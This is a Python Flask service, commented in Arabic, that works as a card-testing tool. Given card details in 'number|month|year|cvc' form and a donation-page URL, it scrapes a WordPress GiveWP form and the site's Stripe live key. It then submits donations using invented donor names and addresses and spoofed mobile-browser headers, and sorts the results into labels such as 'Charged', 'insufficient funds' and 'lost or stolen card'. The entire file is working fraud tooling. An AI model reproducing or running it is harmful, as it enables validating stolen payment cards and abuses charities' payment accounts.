from flask import Flask, request
import requests
import re
import json
import logging
import os
import random
import string
import uuid
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from html import unescape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def get_base_url(full_url):
    parsed = urlparse(full_url)
    return f"{parsed.scheme}://{parsed.netloc}"

def extract_stripe_response(text):
    """تحليل الرد واستخراج رسالة قصيرة ومحددة"""
    # البحث عن رسائل الخطأ المعروفة
    if "Your card was declined" in text:
        return "Your card was declined"
    elif "insufficient funds" in text.lower():
        return "insufficient funds"
    elif "security code is incorrect" in text.lower():
        return "incorrect CVV"
    elif "card number is incorrect" in text.lower():
        return "incorrect card number"
    elif "expiration" in text.lower():
        return "incorrect expiration date"
    elif "processing error" in text.lower():
        return "processing error"
    elif "lost" in text.lower() or "stolen" in text.lower():
        return "lost or stolen card"
    elif "fraud" in text.lower():
        return "suspected fraud"
    elif "do not honor" in text.lower():
        return "do not honor"
    elif "minimum donation" in text.lower():
        return "minimum donation error"
    elif "robot" in text.lower() or "captcha" in text.lower():
        return "captcha required"
    # البحث عن رسائل النجاح
    elif "thank you for your donation" in text.lower() or "donation confirmed" in text.lower():
        return "Charged"
    elif "give-donation-confirmation" in text or "donation-confirmation" in text:
        return "Charged"
    # إذا لم نجد، نعيد نصاً مختصراً
    else:
        # محاولة استخراج أي رسالة من عناصر الخطأ
        error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
        if error_div:
            raw = re.sub(r'<[^>]+>', '', error_div.group(1))
            raw = unescape(raw).strip()
            raw = re.sub(r'\s+', ' ', raw)
            raw = raw.replace('Error:', '').strip()
            return raw[:100]  # أول 100 حرف فقط
        return "Unknown error"

def extract_form_data(html):
    """استخراج الحقول المطلوبة من HTML"""
    data = {}
    patterns = {
        'form_hash': r'name="give-form-hash" value="(.*?)"',
        'form_id_prefix': r'name="give-form-id-prefix" value="(.*?)"',
        'form_id': r'name="give-form-id" value="(.*?)"',
        'pk_live': r'(pk_live_[A-Za-z0-9_-]+)',
        'stripe_account': r'data-account="(.*?)"',
    }
    for key, pattern in patterns.items():
        match = re.search(pattern, html)
        if match:
            data[key] = match.group(1)
    return data

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def stripe_charge(ccx, site_url, amount):
    r = requests.Session()
    r.verify = False
    user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

    try:
        # معالجة البطاقة
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return "ERROR: Invalid CC format"
        n = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3].strip()
        if len(yy) == 4:
            yy = yy[2:]
        elif len(yy) != 2:
            return "ERROR: Invalid year format"

        base = get_base_url(site_url)
        ajax_url = f"{base}/wp-admin/admin-ajax.php"

        # زيارة الصفحة الرئيسية (للكوكيز)
        r.get(base, headers={'User-Agent': user_agent}, timeout=30)

        # زيارة صفحة التبرع
        resp = r.get(site_url, headers={'User-Agent': user_agent}, timeout=30)
        if resp.status_code != 200:
            return f"ERROR: Donation page returned {resp.status_code}"
        html = resp.text

        # استخراج البيانات
        form_data = extract_form_data(html)
        ssa = form_data.get('form_hash')
        ssa00 = form_data.get('form_id_prefix')
        ss000a00 = form_data.get('form_id')
        pk_live = form_data.get('pk_live')
        stripe_account = form_data.get('stripe_account')

        if not ssa or not ssa00 or not ss000a00 or not pk_live:
            missing = []
            if not ssa: missing.append('form_hash')
            if not ssa00: missing.append('form_id_prefix')
            if not ss000a00: missing.append('form_id')
            if not pk_live: missing.append('pk_live')
            return f"ERROR: Missing required fields: {', '.join(missing)}"

        logger.info(f"Extracted pk_live: {pk_live[:10]}...")
        if stripe_account:
            logger.info(f"Extracted stripe_account: {stripe_account[:10]}...")

        # بيانات عشوائية
        username = generate_random_string(8)
        email = f"{username}@gmail.com"
        first_name = "drgam"
        last_name = "drgam"
        address_line1 = "drgam sj"
        city = "tomrr"
        state = "NY"
        zip_code = "10090"
        country = "US"

        # الطلب الأول: give_process_donation
        headers_post = {
            'origin': base,
            'referer': site_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        data_first = {
            'give-honeypot': '',
            'give-form-id-prefix': ssa00,
            'give-form-id': ss000a00,
            'give-form-title': 'Give a Donation',
            'give-current-url': site_url,
            'give-form-url': site_url,
            'give-form-minimum': amount,
            'give-form-maximum': '999999.99',
            'give-form-hash': ssa,
            'give-price-id': 'custom',
            'give-amount': amount,
            'give_stripe_payment_method': '',
            'payment-mode': 'stripe',
            'give_first': first_name,
            'give_last': last_name,
            'give_email': email,
            'give_comment': '',
            'card_name': f"{first_name} {last_name}",
            'billing_country': country,
            'card_address': address_line1,
            'card_address_2': '',
            'card_city': city,
            'card_state': state,
            'card_zip': zip_code,
            'give_action': 'purchase',
            'give-gateway': 'stripe',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }

        logger.info("Sending give_process_donation")
        response_first = r.post(ajax_url, cookies=r.cookies, headers=headers_post, data=data_first, timeout=30)
        logger.debug(f"First POST status: {response_first.status_code}")

        # الطلب الثاني: إنشاء payment method في Stripe
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }

        stripe_data = (
            f'type=card&billing_details[name]={first_name}+{last_name}'
            f'&billing_details[email]={email}'
            f'&billing_details[address][line1]={address_line1}'
            f'&billing_details[address][line2]='
            f'&billing_details[address][city]={city}'
            f'&billing_details[address][state]={state}'
            f'&billing_details[address][postal_code]={zip_code}'
            f'&billing_details[address][country]={country}'
            f'&card[number]={n}'
            f'&card[cvc]={cvc}'
            f'&card[exp_month]={mm}'
            f'&card[exp_year]={yy}'
            f'&guid={uuid.uuid4()}'
            f'&muid={uuid.uuid4()}'
            f'&sid={uuid.uuid4()}'
            f'&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element'
            f'&referrer={base}'
            f'&time_on_page=85758'
            f'&client_attribution_metadata[client_session_id]={uuid.uuid4()}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=split-card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&key={pk_live}'
        )

        if stripe_account:
            stripe_data += f'&_stripe_account={stripe_account}'

        logger.info("Sending Stripe payment method")
        stripe_response = r.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=30)

        if stripe_response.status_code != 200:
            logger.error(f"Stripe API error: {stripe_response.text[:500]}")
            return f"ERROR: Stripe payment method failed: {stripe_response.text[:500]}"

        try:
            payment_id = stripe_response.json()['id']
        except Exception as e:
            logger.error(f"Stripe JSON parse error: {stripe_response.text[:500]}")
            return f"ERROR: Invalid Stripe response: {str(e)} - {stripe_response.text[:500]}"

        logger.info(f"Payment method created: {payment_id}")

        # الطلب الثالث: الطلب النهائي
        headers_final = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': base,
            'referer': site_url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }
        params_final = {
            'payment-mode': 'stripe',
            'form-id': ss000a00,
        }
        data_final = {
            'give-honeypot': '',
            'give-form-id-prefix': ssa00,
            'give-form-id': ss000a00,
            'give-form-title': 'Give a Donation',
            'give-current-url': site_url,
            'give-form-url': site_url,
            'give-form-minimum': amount,
            'give-form-maximum': '999999.99',
            'give-form-hash': ssa,
            'give-price-id': 'custom',
            'give-amount': amount,
            'give_stripe_payment_method': payment_id,
            'payment-mode': 'stripe',
            'give_first': first_name,
            'give_last': last_name,
            'give_email': email,
            'give_comment': '',
            'card_name': f"{first_name} {last_name}",
            'billing_country': country,
            'card_address': address_line1,
            'card_address_2': '',
            'card_city': city,
            'card_state': state,
            'card_zip': zip_code,
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }

        logger.info("Sending final donation request")
        final_response = r.post(site_url, params=params_final, cookies=r.cookies, headers=headers_final, data=data_final, timeout=30, allow_redirects=True)
        html_final = final_response.text

        # تحليل الرد
        result = extract_stripe_response(html_final)
        return result

    except Exception as e:
        logger.exception("Unhandled exception in stripe_charge")
        return f"ERROR: {str(e)}"

@app.route('/pay', methods=['GET'])
def pay_endpoint():
    try:
        cc = request.args.get('cc')
        url = request.args.get('url')
        price = request.args.get('price')
        if not cc or not url or not price:
            return "Missing parameters. Required: cc, url, price", 400
        result = stripe_charge(cc, url, price)
        return str(result), 200
    except Exception as e:
        logger.exception("Endpoint error")
        return f"ERROR: {str(e)}", 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
